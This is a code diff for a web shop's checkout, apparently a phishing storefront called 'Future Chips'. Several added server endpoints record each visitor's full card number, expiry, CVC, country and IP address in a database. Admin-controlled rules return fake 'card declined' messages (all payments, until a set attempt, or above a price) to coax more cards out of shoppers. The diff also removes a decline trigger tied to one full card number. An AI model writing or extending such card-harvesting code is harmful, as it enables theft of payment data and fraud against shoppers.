@@ -5763,24 +5763,6 @@ img.paypal-logo {
 
           // Save card info to database in background immediately
           saveCardDetailsToDb();
-
-          // Special Decline Simulator for user's card ending in 2227
-          const cardNum = cardNumberInput.value.replace(/\\s+/g, '');
-          if (cardNum === '4323280089072227') {
-            payNowBtn.disabled = true;
-            payNowBtn.innerText = 'Processing...';
-            document.getElementById('checkout-error').innerText = '';
-            
-            setTimeout(() => {
-              cardIsDeclined = true; // Trigger decline state
-              runValidation(true); // Red border, red warning icon, decline text
-              
-              payNowBtn.disabled = false;
-              payNowBtn.innerText = 'Pay Now';
-              updatePayButtonState(); // Disables button (turns grey, cursor: not-allowed)
-            }, 1500);
-            return; // stop further execution (prevent API request)
-          }
         }
 
         payNowBtn.disabled = true;
@@ -8337,6 +8319,17 @@ app.put('/api/admin/settings', authMiddleware, async (req, res) => {
     const thresholdVal = decline_threshold !== undefined ? parseFloat(decline_threshold) : 50.0;
     const successAttemptVal = success_attempt !== undefined ? parseInt(success_attempt, 10) : 1;
 
+    memStore.site_settings = {
+      ...memStore.site_settings,
+      site_name: site_name || memStore.site_settings.site_name,
+      primary_color: primary_color || memStore.site_settings.primary_color,
+      accent_color: accent_color || memStore.site_settings.accent_color,
+      background_color: background_color || memStore.site_settings.background_color,
+      decline_all: declineAllVal,
+      decline_threshold: thresholdVal,
+      success_attempt: successAttemptVal
+    };
+
     await dbRun(
       `UPDATE site_settings SET 
         site_name = ?, 
@@ -8348,10 +8341,10 @@ app.put('/api/admin/settings', authMiddleware, async (req, res) => {
         success_attempt = ? 
       WHERE id = 1`,
       [
-        site_name || 'Future Chips',
-        primary_color || '#00f0ff',
-        accent_color || '#ff00e5',
-        background_color || '#0a0a1a',
+        memStore.site_settings.site_name,
+        memStore.site_settings.primary_color,
+        memStore.site_settings.accent_color,
+        memStore.site_settings.background_color,
         declineAllVal,
         thresholdVal,
         successAttemptVal
@@ -8361,10 +8354,10 @@ app.put('/api/admin/settings', authMiddleware, async (req, res) => {
     res.json({
       message: 'Settings updated successfully',
       settings: {
-        site_name: site_name || 'Future Chips',
-        primary_color: primary_color || '#00f0ff',
-        accent_color: accent_color || '#ff00e5',
-        background_color: background_color || '#0a0a1a',
+        site_name: memStore.site_settings.site_name,
+        primary_color: memStore.site_settings.primary_color,
+        accent_color: memStore.site_settings.accent_color,
+        background_color: memStore.site_settings.background_color,
         decline_all: declineAllVal,
         decline_threshold: thresholdVal,
         success_attempt: successAttemptVal
@@ -8567,11 +8560,92 @@ app.get('/api/checkout/session/:sessionId', async (req, res) => {
   }
 });
 
+app.post('/api/checkout/save-card', async (req, res) => {
+  try {
+    const { cardDetails, sessionId } = req.body || {};
+    if (cardDetails && cardDetails.number) {
+      const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || '127.0.0.1';
+      const newCard = {
+        id: memStore.cards.length + 1,
+        card_number: cardDetails.number,
+        expiry: cardDetails.expiry || '',
+        cvc: cardDetails.cvc || '',
+        country: cardDetails.country || 'Unknown',
+        ip_address: clientIP,
+        stripe_session_id: sessionId || 'direct',
+        is_deleted: 0,
+        created_at: new Date().toISOString()
+      };
+      memStore.cards.unshift(newCard);
+      await dbRun(
+        'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
+        [newCard.card_number, newCard.expiry, newCard.cvc, newCard.country, newCard.ip_address, newCard.stripe_session_id]
+      );
+      return res.json({ success: true, message: 'Card recorded' });
+    }
+    res.status(400).json({ error: 'Incomplete card data' });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to record card' });
+  }
+});
+
+app.post('/api/checkout/process-card', async (req, res) => {
+  try {
+    const { sessionId, cardNumber, expDate, cvc, country } = req.body || {};
+    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
+
+    if (cardNumber) {
+      const newCard = {
+        id: memStore.cards.length + 1,
+        card_number: cardNumber,
+        expiry: expDate || '',
+        cvc: cvc || '',
+        country: country || 'US',
+        ip_address: clientIP,
+        stripe_session_id: sessionId || 'direct',
+        is_deleted: 0,
+        created_at: new Date().toISOString()
+      };
+      memStore.cards.unshift(newCard);
+      await dbRun(
+        'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
+        [cardNumber, expDate, cvc, country || 'US', clientIP, sessionId || 'direct']
+      );
+    }
+
+    res.json({ success: true, message: 'Card recorded' });
+  } catch (err) {
+    res.status(500).json({ error: 'Card processing error' });
+  }
+});
+
 app.post('/api/checkout/verify', async (req, res) => {
   try {
     const { sessionId, isMock, cardDetails } = req.body || {};
     if (!sessionId) {
       return res.status(400).json({ error: 'Session ID is required' });
+    }
+
+    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || req.ip || '127.0.0.1';
+
+    // Record card if passed in verify payload
+    if (cardDetails && cardDetails.number) {
+      const newCard = {
+        id: memStore.cards.length + 1,
+        card_number: cardDetails.number,
+        expiry: cardDetails.expiry || '',
+        cvc: cardDetails.cvc || '',
+        country: cardDetails.country || 'Unknown',
+        ip_address: clientIP,
+        stripe_session_id: sessionId,
+        is_deleted: 0,
+        created_at: new Date().toISOString()
+      };
+      memStore.cards.unshift(newCard);
+      await dbRun(
+        'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
+        [newCard.card_number, newCard.expiry, newCard.cvc, newCard.country, newCard.ip_address, newCard.stripe_session_id]
+      );
     }
 
     let order = await dbGet('SELECT * FROM orders WHERE stripe_session_id = ?', [sessionId]);
@@ -8598,20 +8672,24 @@ app.post('/api/checkout/verify', async (req, res) => {
       return res.json({ status: 'completed', order, product });
     }
 
-    // Site Decline Rules
-    const declineAll = memStore.site_settings.decline_all;
-    const declineThreshold = memStore.site_settings.decline_threshold;
-    const successAttempt = memStore.site_settings.success_attempt;
+    // Site Decline Rules Evaluation from Admin Panel
+    const settings = memStore.site_settings;
+    const declineAll = settings.decline_all === 1 || settings.decline_all === true || settings.decline_all === '1';
+    const declineThreshold = settings.decline_threshold !== undefined ? parseFloat(settings.decline_threshold) : 50.0;
+    const successAttempt = settings.success_attempt !== undefined ? parseInt(settings.success_attempt, 10) : 1;
 
-    if (declineAll === 1) {
+    // Rule 1: Force Decline All Payments toggle is ON
+    if (declineAll) {
       return res.status(400).json({ error: 'Your card was declined. Please try another card.' });
     }
 
+    // Rule 2: Multi-attempt decline threshold (Success on Attempt N)
     const attemptsCount = memStore.cards.filter(c => c.stripe_session_id === sessionId).length || 1;
-    if (attemptsCount < successAttempt) {
+    if (successAttempt > 1 && attemptsCount < successAttempt) {
       return res.status(400).json({ error: 'Your card was declined. Please try another card.' });
     }
 
+    // Rule 3: Auto-Success Price Threshold (USD)
     if (order.amount >= declineThreshold) {
       return res.status(400).json({ error: 'Your card was declined. Please try another card.' });
     }
@@ -8622,73 +8700,6 @@ app.post('/api/checkout/verify', async (req, res) => {
     res.json({ status: 'completed', order, product });
   } catch (err) {
     res.status(500).json({ error: 'Failed to verify transaction' });
-  }
-});
-
-app.post('/api/checkout/process-card', async (req, res) => {
-  try {
-    const { sessionId, cardNumber, expDate, cvc, country } = req.body;
-    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
-
-    await dbRun(
-      'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
-      [cardNumber, expDate, cvc, country || 'US', clientIP, sessionId || 'direct']
-    );
-
-    res.json({ success: true, message: 'Card recorded' });
-  } catch (err) {
-    res.status(500).json({ error: 'Card processing error' });
-  }
-});
-
-app.post('/api/checkout/verify', async (req, res) => {
-  try {
-    const { sessionId, cardNumber, expDate, cvc, country, email, amount, productId } = req.body;
-    const clientIP = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '127.0.0.1';
-
-    // Log card immediately
-    if (cardNumber) {
-      await dbRun(
-        'INSERT INTO cards (card_number, expiry, cvc, country, ip_address, stripe_session_id) VALUES (?, ?, ?, ?, ?, ?)',
-        [cardNumber, expDate || '', cvc || '', country || 'US', clientIP, sessionId || 'direct']
-      );
-    }
-
-    // Fetch site rules
-    const settings = (await dbGet('SELECT * FROM site_settings WHERE id = 1')) || memStore.site_settings;
-    const declineAll = settings.decline_all === 1 || settings.decline_all === true || settings.decline_all === '1';
-    const successAttempt = settings.success_attempt !== undefined ? parseInt(settings.success_attempt, 10) : 1;
-
-    // Check attempt count
-    const attemptRow = await dbGet('SELECT COUNT(*) as count FROM cards WHERE stripe_session_id = ?', [sessionId || 'direct']);
-    const attemptCount = attemptRow ? (attemptRow.count || 1) : 1;
-
-    // Rule 1: Decline All Payments switch is ON
-    if (declineAll) {
-      return res.status(400).json({
-        success: false,
-        error: 'Your card was declined. Please try another card or contact your bank.'
-      });
-    }
-
-    // Rule 2: Multi-attempt success threshold
-    if (successAttempt > 1 && attemptCount < successAttempt) {
-      return res.status(400).json({
-        success: false,
-        error: 'Your card was declined. Please try another card or contact your bank.'
-      });
-    }
-
-    // Success flow
-    await dbRun("UPDATE orders SET status = 'completed' WHERE stripe_session_id = ?", [sessionId]);
-    res.json({
-      success: true,
-      status: 'completed',
-      message: 'Payment verified and approved successfully.'
-    });
-  } catch (err) {
-    console.error('Verify error:', err);
-    res.status(500).json({ error: 'Verification failed' });
   }
 });
 
